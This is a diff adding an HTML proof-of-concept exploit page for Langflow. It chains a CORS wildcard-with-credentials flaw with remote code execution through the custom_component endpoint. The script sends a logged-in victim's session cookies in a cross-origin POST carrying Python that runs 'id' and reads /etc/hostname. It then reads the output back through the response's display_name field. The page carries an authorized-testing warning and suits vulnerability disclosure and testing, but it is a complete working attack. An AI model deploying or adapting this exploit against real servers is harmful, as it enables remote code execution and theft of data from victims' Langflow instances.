@@ -1,0 +1,159 @@
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+          <meta charset="UTF-8" />
+          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+          <title>Langflow CORS RCE PoC</title>
+          <style>
+            body {
+              font-family: monospace;
+              background: #1a1a1a;
+              color: #e0e0e0;
+              max-width: 900px;
+              margin: 40px auto;
+              padding: 20px;
+            }
+            h1 { color: #ff4444; }
+            .warning {
+              background: #3a1a1a;
+              border: 1px solid #ff4444;
+              padding: 12px;
+              margin-bottom: 20px;
+            }
+            label { display: block; margin-top: 12px; }
+            input[type=text] {
+              width: 100%;
+              padding: 8px;
+              background: #2a2a2a;
+              color: #e0e0e0;
+              border: 1px solid #555;
+              font-family: monospace;
+              box-sizing: border-box;
+            }
+            button {
+              margin-top: 14px;
+              padding: 10px 24px;
+              background: #cc0000;
+              color: #fff;
+              border: none;
+              font-family: monospace;
+              font-size: 1em;
+              cursor: pointer;
+            }
+            button:hover { background: #ff0000; }
+            #results {
+              margin-top: 20px;
+              background: #0a0a0a;
+              border: 1px solid #444;
+              padding: 14px;
+              white-space: pre-wrap;
+              min-height: 80px;
+            }
+            .success { color: #44ff44; }
+            .error   { color: #ff6666; }
+          </style>
+        </head>
+        <body>
+
+        <h1>Langflow CORS RCE PoC</h1>
+
+        <div class="warning">
+          FOR AUTHORIZED SECURITY TESTING ONLY.<br/>
+          This page demonstrates VULN-009 (CORS wildcard reflection with
+          credentials) chained with VULN-002 (RCE via custom_component exec()).<br/>
+          <br/>
+          When a logged-in Langflow user visits this page and clicks the button,
+          their browser sends their session cookies to the Langflow server via a
+          credentialed cross-origin fetch(). The server executes arbitrary Python
+          and returns the result. CORS allows this page to READ the response.
+        </div>
+
+        <label for="targetUrl">Target Langflow URL:</label>
+        <input type="text" id="targetUrl" value="http://localhost:7860" />
+
+        <button onclick="launchAttack()">Launch Attack</button>
+
+        <div id="results">Results will appear here after the attack...</div>
+
+        <script>
+          const RCE_CODE = `import os
+
+_id_output = __import__("os").popen("id").read().strip()
+_hostname = open("/etc/hostname").read().strip()
+_exfil = "CORS_RCE_PROOF: id=" + _id_output + " host=" + _hostname
+
+from langflow.custom import Component
+from langflow.io import Output, MessageTextInput
+
+class CorsRceProbe(Component):
+    display_name = _exfil[:300]
+    description = "CORS RCE proof"
+    inputs = [MessageTextInput(name="x", display_name="X")]
+    outputs = [Output(display_name="O", name="o", method="run")]
+    def run(self):
+        pass
+`;
+
+          async function launchAttack() {
+            const targetUrl = document.getElementById("targetUrl").value.replace(/\/+$/, "");
+            const resultsDiv  = document.getElementById("results");
+
+            resultsDiv.textContent = "[*] Sending credentialed cross-origin POST to:\n"
+              + targetUrl + "/api/v1/custom_component\n"
+              + "[*] Browser will attach victim session cookies (credentials: include)\n"
+              + "[*] Waiting for response...";
+
+            const requestBody = JSON.stringify({ code: RCE_CODE });
+
+            let response;
+            try {
+              response = await fetch(targetUrl + "/api/v1/custom_component", {
+                method: "POST",
+                credentials: "include",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: requestBody,
+              });
+            } catch (err) {
+              resultsDiv.className = "error";
+              resultsDiv.textContent = "[!] Network error: " + err.message + "\n"
+                + "    Is Langflow running? Is the URL correct?\n"
+                + "    (CORS preflight may also have been rejected -- check the browser console)";
+              return;
+            }
+
+            let body;
+            try {
+              body = await response.json();
+            } catch (_) {
+              body = await response.text().catch(() => "(could not read body)");
+            }
+
+            if (response.ok) {
+              const displayName = (body && body.data && body.data.display_name)
+                ? body.data.display_name
+                : JSON.stringify(body, null, 2);
+
+              resultsDiv.className = "success";
+              resultsDiv.textContent =
+                "[+] CORS RCE CONFIRMED\n"
+                + "[+] HTTP " + response.status + " -- server executed the payload\n"
+                + "[+] Response readable by this cross-origin page (CORS allows it)\n\n"
+                + "=== display_name (exfiltrated RCE output) ===\n"
+                + displayName + "\n\n"
+                + "=== Full JSON response ===\n"
+                + JSON.stringify(body, null, 2);
+            } else {
+              resultsDiv.className = "error";
+              resultsDiv.textContent =
+                "[!] Request returned HTTP " + response.status + "\n"
+                + "    This may mean the victim is not logged in, or\n"
+                + "    allow_custom_components=False on this server.\n\n"
+                + JSON.stringify(body, null, 2);
+            }
+          }
+        </script>
+
+        </body>
+        </html>
